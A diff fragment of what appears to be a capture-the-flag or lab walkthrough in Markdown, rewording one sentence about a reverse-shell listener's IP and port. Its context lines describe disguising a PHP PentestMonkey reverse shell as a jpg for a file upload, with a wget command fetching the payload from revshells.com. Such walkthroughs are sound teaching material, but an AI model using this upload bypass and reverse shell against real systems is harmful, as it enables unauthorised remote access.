@@ -68,7 +68,7 @@ On reviewing the **archivo.html** page, we realized the form allows **jpg** uplo
 
 We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and save it as a **jpg** file. 
 
-Notice that we set the **172.17.0.1** and **4444** as the **IP** and **PORT** for the listener.
+Note that we set the **172.17.0.1** as the **IP** and **4444** as the **PORT** for the listener.
 
 ```shell
 wget -O reverse.jpg 'https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash'
